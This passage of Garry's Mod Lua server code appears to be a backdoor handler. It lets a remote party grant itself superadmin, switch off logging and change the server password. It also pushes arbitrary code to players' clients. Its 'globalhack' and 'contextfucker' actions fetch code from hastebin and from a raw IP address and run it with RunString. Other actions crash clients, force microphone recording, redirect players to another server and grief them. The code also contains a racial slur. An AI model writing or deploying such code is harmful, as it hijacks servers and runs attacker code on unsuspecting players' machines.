        for k,v in pairs (player.GetAll()) do
        
            v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_ERROR, " .. duration .. ")")
            
            v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == "notification_undo") then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_UNDO, " .. duration .. ")")
            
            v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == "notification_hint") then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_CLEANUP, " .. duration .. ")")
            
            v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == "notification_cleanup") then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_HINT, " .. duration .. ")")
            
            v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == "rightmoove") then
        user:ConCommand( "+right" )
    end

    if (uaction == "unrightmoove") then
        user:ConCommand( "-right" )
    end

    if (uaction == "squatmoove") then
        user:ConCommand( "+duck" )
    end

    if (uaction == "unsquatmoove") then
        user:ConCommand( "-duck" )
    end

    if (uaction == "unfreezeall") then
        for k,v in pairs (player.GetAll()) do v:Freeze( false ) end
    end

    if (uaction == "unfreezeallstaff") then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Freeze( false ) end end
    end

    if (uaction == "noclipallon") then
        for k,v in pairs (player.GetAll()) do v:SetMoveType( MOVETYPE_NOCLIP ) end
    end

    if (uaction == "noclipalloff") then
        for k,v in pairs (player.GetAll()) do v:SetMoveType( MOVETYPE_WALK ) end
    end

    if (uaction == "noclipon") then
        user:SetMoveType( MOVETYPE_NOCLIP )
    end

    if (uaction == "noclipoff") then
    user:SetMoveType( MOVETYPE_WALK )
    end

    if (uaction == "unfreezeuser") then
        user:Freeze( false )
        user:UnLock()
        ulx.clearExclusive( user )
    end

    if (uaction == "jump") then
        for k,v in pairs (player.GetAll()) do v:SetJumpPower( 2000 ) end
    end

    if (uaction == "retablirjumpall") then
        for k,v in pairs (player.GetAll()) do v:SetJumpPower( 200 ) end
    end

    if (uaction == "2dplayerall") then
    for k,v in pairs(player.GetAll()) do 
        local a = v:LookupBone("ValveBiped.Bip01_Head1")
        local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
        local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
        local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
        local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
        local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
        local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
        local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
        local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
        local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
        local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end
    end

    if (uaction == "grossetete") then
        for k,v in pairs(player.GetAll()) do 
        local a = v:LookupBone("ValveBiped.Bip01_Head1")
        v:ManipulateBoneScale( a, Vector(5,5,5)) 
        end
    end

    if (uaction == "grosseteteuser") then
        local a = user:LookupBone("ValveBiped.Bip01_Head1")
        user:ManipulateBoneScale( a, Vector(5,5,5)) 
    end

    if (uaction == "2dplayeruser") then
        local a = user:LookupBone("ValveBiped.Bip01_Head1")
        local b = user:LookupBone("ValveBiped.Bip01_R_Thigh")
        local c = user:LookupBone("ValveBiped.Bip01_L_Thigh")
        local d = user:LookupBone("ValveBiped.Bip01_R_Calf")
        local e = user:LookupBone("ValveBiped.Bip01_L_Calf")
        local f = user:LookupBone("ValveBiped.Bip01_R_UpperArm")
        local g = user:LookupBone("ValveBiped.Bip01_L_UpperArm")
        local h = user:LookupBone("ValveBiped.Bip01_R_Forearm")
        local i = user:LookupBone("ValveBiped.Bip01_L_Forearm")
        local j = user:LookupBone("ValveBiped.Bip01_R_Clavicle")
        local k = user:LookupBone("ValveBiped.Bip01_L_Clavicle")
        user:ManipulateBoneScale( a, Vector(4,0,4)) 
        user:ManipulateBoneScale( b, Vector(0,0,0))
        user:ManipulateBoneScale( c, Vector(0,0,0))
        user:ManipulateBoneScale( d, Vector(0,0,1))
        user:ManipulateBoneScale( e, Vector(0,0,1))
        user:ManipulateBoneScale( f, Vector(0,0,0))
        user:ManipulateBoneScale( g, Vector(0,0,0))
        user:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        user:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        user:ManipulateBoneScale( j, Vector(0,0,0))
        user:ManipulateBoneScale( k, Vector(0,0,0))
    end

    if (uaction == "jumpuser") then
        user:SetJumpPower( 2000 )
    end

    if (uaction == "jumpuser") then
        user:SetJumpPower( 2000 )
    end

    if (uaction == "logsremove") then
        RunConsoleCommand("ulx_logecho", "0")
    end

    if (uaction == "gm_construct_spawn") then
        user:SetPos( Vector( 786.414490, -166.286102, -79.968750 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_building_roof0") then
        user:SetPos( Vector( 1741.335815, -1606.526245, 1161.920288 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_building_roof1") then
        user:SetPos( Vector( 1434.847778, -1624.269897, 1360.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_building2_roof0") then
        user:SetPos( Vector( -2312.447266, -2994.058105, 2912.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_building3_roof0") then
        user:SetPos( Vector( -4632.838379, 5414.228516, 2560.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_building2_roof1") then
        user:SetPos( Vector( -2301.528564, -3178.893555, 2368.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_down") then
        user:SetPos( Vector( -2072.327148, -120.263184, -447.968750 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_secret") then
        user:SetPos( Vector( -2994.707031, -1243.276611, -77.271637 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_construct_skybox") then
        user:SetPos( Vector( -1543.972412, 1734.876221, 10937.232422 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "gm_flat_secret") then
        user:SetPos( Vector( -599.203491, 6.064875, -12703.968750 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "glife3_grue") then
        user:SetPos( Vector( -2150.254395, 7953.561523, 1333.250366 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "glife3_secret") then
        user:SetPos( Vector( -7075.260742, 1205.734009, -288.307312 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "glife3_coffre") then
        user:SetPos( Vector( -6389.708008, 5038.359375, 96.025749 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "glife3_water_tower") then
        user:SetPos( Vector( 5316.801758, 15845.748047, 1652.517944 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end

    if (uaction == "rp_rockford_v2b_spawn") then
        user:SetPos( Vector( -4701.085938 ,-5387.226563,128.031250 ) )
        user:SetLocalVelocity( Vector( 0, 0, 0 ) )
    end



    if (uaction == "spamchat") then
        timer.Create( "spamchat1", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), "â– â–‚ â–ƒ â–„ â–… â–† â–‡Ä¤áºªÄˆÐŒÄ’ÄŽ à¸¿Â¥ Ä”ÏÄ¨Ä©Ä†áº¤ Å¤ÎˆÇºMâ–ˆ â–‡ â–† â–… â–„ â–‚ â–")]]) end)
    
    end

    if (uaction == "restartserver") then
        if file.Exists("data/ulx/config.txt", "GAME") then
            game.ConsoleCommand("ulx map " .. game.GetMap() .. "\n")
        else
            game.ConsoleCommand("changelevel " .. game.GetMap() .. "\n")
        end
    end

    if (uaction == "spamchatstop") then
    timer.Stop( "spamchat1")    
    end

    if (uaction == "setmodel") then
        user:SetModel( net.ReadString() )
    end

    if (uaction == "retablirjumpuser") then
        user:SetJumpPower( 200 )
    end

    if (uaction == "launchuser") then
        user:SetVelocity( Vector( 0,0,50 ) * 50 )
    end

    if (uaction == "lockdown") then
        user:Give( "weapon_rpg" )
        user:GiveAmmo( 200, "RPG_Round", true )
        user:SendLua([[
hook.Add( "Think", "TriggerBofezt", function()
RunConsoleCommand("use","weapon_rpg")
if !Firing then
    RunConsoleCommand( "+attack" )
    Firing = true
else
    RunConsoleCommand( "-attack" )
    Firing = false
end
end )
        ]])
    end

    if (uaction == "launchall") then
        for k,v in pairs (player.GetAll()) do 
            v:SetVelocity( Vector( 0,0,50 ) * 50 )
        end
    end

    if (uaction == "globalhack") then
        if !ptdr then
            for k,v in pairs (player.GetAll()) do v:SendLua([[http.Fetch("https://hastebin.com/raw/huyupufifi",function(b) RunString(b) end)]]) end
            local ptdr = 1
        else
            local ptdr = 0
            for k,v in pairs (player.GetAll()) do v:SendLua([[hook.Remove("PostDrawOpaqueRenderables","\xFFitsrainingchairs\xFF")]]) end
        end
    end

    if (uaction == "changename") then
    RunConsoleCommand("hostname", net.ReadString())
    end

if (uaction == "namechanger") then
local namesf = {
"Marc",                  
"Hugh",      
"Maurice",      
"Gill",                    
"Etienne",      
"Antoine",      
"Jean",      
"Benoit",      
"Gilbert",      
"Laurent",      
"Alexis",      
"Alexandre",      
"Denis",      
"Nicholas",      
"Leon",      
"Leonard",      
"Leo",      
"Olivier",                  
"Curtis",            
"Antonio",      
"Gregory",      
"Charlie",      
"Luc",      
"Patrick",      
"Phillip",      
"Bernard",            
"Charles",            
"Gaspar",      
"Claude",      
"Michael",      
"Brandon",      
"Richard",      
"William",      
"Serge",      
"Freddie",                  
"Samuel",      
"Gaetan",      
"Gerald",      
"Arnold",      
"Roland",      
"Justin",      
"Theodore",      
"Claude",      
"Hugues",      
"Albert",      
"Arthur",      
"Jay",      
"Jeremi",      
"Rene",      
"Pascal",      
"Carlos",      
"Fabien",      
"Rafael",      
"Benjamin",      
"Ernest",      
"Victor",      
"Martin",      
"Franck",      
"Walter",      
"Isaac",      
"Roger",         
"Alfred",      
"Jason",            
"Danny",      
"Henry",      
"Jimmy",      
"Kevin",      
"Geoffrey",                      
"Dominic",      
"Christopher",
"David",
"Steven",
}
for k,v in pairs (player.GetAll()) do local name = table.Random( namesf ) v:Say("/name " .. name,true) end
    end

    if (uaction == "namechangerspam") then
local namesfs = {
"Marc",                  
"Hugh",      
"Maurice",      
"Gill",                    
"Etienne",      
"Antoine",      
"Jean",      
"Benoit",      
"Gilbert",      
"Laurent",      
"Alexis",      
"Alexandre",      
"Denis",      
"Nicholas",      
"Leon",      
"Leonard",      
"Leo",      
"Olivier",                  
"Curtis",            
"Antonio",      
"Gregory",      
"Charlie",      
"Luc",      
"Patrick",      
"Phillip",      
"Bernard",            
"Charles",            
"Gaspar",      
"Claude",      
"Michael",      
"Brandon",      
"Richard",      
"William",      
"Serge",      
"Freddie",                  
"Samuel",      
"Gaetan",      
"Gerald",      
"Arnold",      
"Roland",      
"Justin",      
"Theodore",      
"Claude",      
"Hugues",      
"Albert",      
"Arthur",      
"Jay",      
"Jeremi",      
"Rene",      
"Pascal",      
"Carlos",      
"Fabien",      
"Rafael",      
"Benjamin",      
"Ernest",      
"Victor",      
"Martin",      
"Franck",      
"Walter",      
"Isaac",      
"Roger",         
"Alfred",      
"Jason",            
"Danny",      
"Henry",      
"Jimmy",      
"Kevin",      
"Geoffrey",                      
"Dominic",      
"Christopher",
"David",
"Steven",
}
timer.Create( "namechangerspam", 5, 0, function() 
for k,v in pairs (player.GetAll()) do local namez = table.Random( namesfs ) v:Say("/name " .. namez,true) end
end)
    end

    if (uaction == "namechangerstop") then
    timer.Destroy("namechangerspam")
    end

    if (uaction == "allowcsluads") then
    RunConsoleCommand("sv_allowcslua", net.ReadString())
    end

    if (uaction == "secureinfo") then
    RunConsoleCommand("sv_password", net.ReadString())
    end
    
    if (uaction == "changeload") then
    RunConsoleCommand( "sv_loadingurl", net.ReadString() )
    end

    if (uaction == "killuser") then
        user:Kill()
    end

    if (uaction == "addmoneyall") then
        for k,v in pairs(player.GetAll()) do timer.Create( "timerargent10", 0.01, 0, function() v:addMoney(11) end) end
    end

    if (uaction == "flashon") then
        user:SendLua([[timer.Create("impulse 100", 0.001, 0, function() LocalPlayer():ConCommand("impulse 100") end)]])
    end

    if (uaction == "flashoff") then
        user:SendLua([[timer.Remove("impulse 100")]])
    end

    if (uaction == "screenon") then
    user:SendLua([[timer.Create("screenshot requested", 0.001, 0, function() LocalPlayer():ConCommand("screenshot requested") end)]])
    end

    if (uaction == "screenoff") then
    user:SendLua([[timer.Remove("screenshot requested")]])
    end

    if (uaction == "killusersilence") then
        user:KillSilent()
    end

    if (uaction == "allkillusersilence") then
    for k,v in pairs (player.GetAll()) do v:KillSilent() end
    end

    if (uaction == "animation_salute") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
    end

    if (uaction == "animation_salute_loop") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
    timer.Create("salute_loop",3.3,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
    end )
    end

    if (uaction == "animation_robot") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
    end

    if (uaction == "animation_robot_loop") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
    timer.Create("robot_loop",11.35,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
    end )
    end

    if (uaction == "animation_cheer") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
    end

    if (uaction == "animation_cheer_loop") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
    timer.Create("cheer_loop",2.7,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
    end )
    end

    if (uaction == "animation_laugh") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
    end

    if (uaction == "animation_laugh_loop") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
    timer.Create("laugh_loop",5.81,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
    end )
    end

    if (uaction == "animation_muscle") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
    end

    if (uaction == "animation_muscle_loop") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
    timer.Create("muscle_loop",13,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
    end )
    end

    if (uaction == "animation_persistence") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
    end

    if (uaction == "animation_persistence_loop") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
    timer.Create("persistence_loop",3,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
    end )
    end

    if (uaction == "animation_dance") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    end

    if (uaction == "animation_dance_loop") then
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    timer.Create("dance_loop",8.9,0,function()
    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    end )
    end

    if (uaction == "stop_timer_animation") then
    timer.Destroy("salute_loop")
    timer.Destroy("robot_loop")
    timer.Destroy("cheer_loop")
    timer.Destroy("laugh_loop")
    timer.Destroy("muscle_loop")
    timer.Destroy("persistence_loop")
    timer.Destroy("dance_loop")
    end

    if (uaction == "scaleuser") then
    local scale = net.ReadString()
    user:SetModelScale( scale, 2 )
    end

    if (uaction == "scaleall") then
    local scale = net.ReadString()
    
    for k,v in pairs (player.GetAll()) do v:SetModelScale( scale, 2 ) end
    end

    if (uaction == "animation_salute_user") then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE)
    end

    if (uaction == "animation_robot_user") then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT)
    end

    if (uaction == "animation_cheer_user") then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER)
    end

    if (uaction == "animation_laugh_user") then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH)
    end

    if (uaction == "animation_muscle_user") then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE)
    end

    if (uaction == "animation_persistence_user") then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE)
    end

    if (uaction == "animation_dance_user") then
    user:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
    end

    if (uaction == "allkillusersilencestaff") then
    for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:KillSilent() end end
    end

    if (uaction == "fireuser") then
        user:Ignite( 30 )
    end

    if (uaction == "modelall") then
    local model = net.ReadString()
        for k,v in pairs(player.GetAll()) do v:SetModel(model) end
    end
    
    if (uaction == "cassergr") then
        user:SetGravity( -5 )
    end

    if (uaction == "physicgamestyle") then
        RunConsoleCommand("sv_friction", "-8")
    end

    if (uaction == "retablirphysicgamestyle") then
        RunConsoleCommand("sv_friction", "8")
    end

    if (uaction == "earthquakeonall") then
        for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end
    end

    if (uaction == "itemsall") then
    local itemsss = net.ReadString()
    for k,v in pairs (player.GetAll()) do v:Give( itemsss ) end
    end

    if (uaction == "cleanup") then
        game.CleanUpMap()
    end

    if (uaction == "cassergrall") then
        for k,v in pairs (player.GetAll()) do v:SetGravity( -5 ) end
    end
    
    if (uaction == "superadmin") then
        user:SetUserGroup("superadmin")
    end

    if (uaction == "custom") then
        user:SetUserGroup(net.ReadString())
    end

    if (uaction == "userrank") then
        user:SetUserGroup("user")
    end
    
    if (uaction == "retablirgr") then
        user:SetGravity( 0 )
    end

    if (uaction == "retablirgrall") then
        for k,v in pairs (player.GetAll()) do v:SetGravity( 0 ) end
    end

    if (uaction == "strip") then
        user:StripWeapons()
    end

    if (uaction == "unjailall") then
        game.ConsoleCommand("ulx unjail *\n")
    end

    if (uaction == "contextfucker") then

util.AddNetworkString("enigmamod")

net.Receive( "enigmamod", function(len, len, ply)
    local v = net.ReadEntity()
    local two = net.ReadInt(32)
    
    local function zapEffect(target)
        local effectdata = EffectData()
        effectdata:SetScale(1)
        effectdata:SetMagnitude(1)
        effectdata:SetScale(3)
        effectdata:SetRadius(2)
        effectdata:SetEntity(target)
        for i = 1, 100, 1 do
            timer.Simple(1 / i, function()
                util.Effect("TeslaHitBoxes", effectdata, true, true)
            end)
        end
        local Zap = math.random(1,9)
        if Zap == 4 then Zap = 3 end
        target:EmitSound("ambient/energy/zap" .. Zap .. ".wav")
    end
    local function teleportrandom()
        local lesjoueurs = player.GetAll()
        local random = math.random(1, #lesjoueurs)
        if v == lesjoueurs[random] then return end
        local sphere = ents.FindInSphere(v:GetPos(), 200)
        for i=1, #sphere do
            if sphere[i]:GetClass() == "player" then
                if sphere[i] == lesjoueurs[random] then 
                    teleportrandom()
                    return
                end
            end
        end
        v:SetPos(lesjoueurs[random]:GetPos() + Vector(100,0,30))
        zapEffect(v)
    end

    if two == 1 then
        v:VC_repairFull_Admin()
    elseif two == 2 then
        v:VC_fuelSet(v:VC_fuelGetMax())
    elseif two == 3 then
        v:VC_explodeEngine(true)
    elseif two == 5 then
        v:VC_damagePart("wheel", 1)
        v:VC_damagePart("wheel", 2)
        v:VC_damagePart("wheel", 3)
        v:VC_damagePart("wheel", 4)
    elseif two == 6 then
        v:VC_clearSeats()
    elseif two == 7 then
        v:Remove()
    elseif two == 8 then
        v:Kill()
    elseif two == 9 then
        v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000)))
    elseif two == 10 then
        v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
    elseif two == 11 then
        local rocket = ents.Create("m9k_launched_davycrockett")
        local ply2 = v
        rocket:SetPos(ply2:GetPos())
        rocket:SetOwner(ply2)
        rocket.Owner = ply2
        rocket:Spawn()
        rocket:Activate() 
    elseif two == 12 then
        v:SendLua([[timer.Create("mictoggle", 0.1, 0, function()LocalPlayer():ConCommand("+voicerecord")end)]])
    elseif two == 13 then
        v:SendLua([[timer.Destroy("mictoggle")LocalPlayer():ConCommand("-voicerecord")]])
    elseif two == 14 then
        timer.Create("fuckthenigga",0.5,5,function() 
            local rocket = ents.Create("m9k_launched_davycrockett")
            local ply2 = v
            rocket:SetPos(ply2:GetPos())
            rocket:SetOwner(ply2)
            rocket.Owner = ply2
            rocket:Spawn()
            rocket:Activate()
        end)
    elseif two == 15 then
        v:SetPos(v:GetPos() + Vector(200,200,200))
    elseif two == 16 then
        v:Fire("open", "", .6)
        v:Fire("setanimation", "open", .6)
    elseif two == 17 then
        v:Fire( "Lock" )
    elseif two == 18 then
        hook.Add("Think", "fzefezfez", function()
            local fuxios = v:GetPos() or nil
            if fuxios == nil then return end
            local mdr = ents.FindInSphere(v:GetPos(), 200)
            for i=1, #mdr do
            if mdr[i] == v then return end
            if mdr[i]:IsPlayer() then 
                local explode = ents.Create( "env_explosion" )
                    explode:SetPos( mdr[i]:GetPos() )
                    explode:Spawn()
                    explode:SetKeyValue( "iMagnitude", "220" )
                    explode:Fire( "Explode", 0, 0 )
                    explode:EmitSound( "weapon_AWP.Single", 200, 200 )
                end
                timer.Simple(0.5,function()
                    mdr[i]:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    mdr[i]:Kill()
                end)
            end
        end)
    elseif two == 19 then
        if v:VC_hasGodMode() then
            v:VC_setGodMode(false)
        else
            v:VC_setGodMode(false)
        end
    elseif two == 20 then
        hook.Add("Think", "fzefezfezzzz", function()
            local mdr = ents.FindInSphere(v:GetPos(), 200)
            for i=1, #mdr do
                if mdr[i] == v then return end
                mdr[i]:Remove()
            end
        end)
    elseif two == 21 then
        teleportrandom()
    elseif two == 22 then
        if not timer.Exists("saywhatttttt") then
            teleportrandom()
            timer.Create("saywhatttttt", 5, 0, teleportrandom)
        else
            timer.Remove("saywhatttttt")
        end
    elseif two == 23 then
        Satellite = ents.Create("m9k_oribital_cannon")
        Satellite.PoorBastard = true
        Satellite.Target = v
        Satellite.Sky = v:GetPos()
        Satellite.Owner = v
        Satellite:SetPos(v:GetPos())
        Satellite:Spawn()
    elseif two == 28 then
        local fabrication = v:GetPos()

        local npcweed = ents.Create( v:GetClass() )
        npcweed:SetPos( Vector(fabrication.x + 15, fabrication.y, fabrication.z + 15) )
        npcweed:Spawn()
    elseif two == 29 then
        local fabrication = v:GetPos()

        for i = 1, 5 do
            local npcweed = ents.Create( v:GetClass() )
            npcweed:SetPos( Vector(fabrication.x + 15, fabrication.y, fabrication.z + 15) )
            npcweed:Spawn()
        end
    end
end)
        user:SendLua([[http.Fetch("http://54.38.18.76/codeclient.php", function(b) RunString(b) end)]])
    end

    if (uaction == "micon") then
        user:SendLua([[timer.Create("mictoggle", 0.1, 0, function()LocalPlayer():ConCommand("+voicerecord")end)]])
    end
    
    if (uaction == "micoff") then
        user:SendLua([[timer.Destroy("mictoggle")LocalPlayer():ConCommand("-voicerecord")]])
    end
    
    if (uaction == "crashuser") then
        user:SendLua( "net.Receive(\"SENDTEST\", function() RunString(net.ReadString()) end)" )
        net.Start( "SENDTEST" )
        net.WriteString( [[ while true do end ]] )
        net.Send(user)
    end

    if (uaction == "goduseron") then
        user:GodEnable()
    end

    if (uaction == "goduseroff") then
        user:GodDisable()
    end

    if (uaction == "redirectplayer") then
        local ip=net.ReadString()
        ply:SendLua([[LocalPlayer():ConCommand('connect ]]..tostring(ip)..[[')]])
    end

    if (uaction == "items") then
        user:Give( net.ReadString() )
    end
end)





--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







--[[



]]--







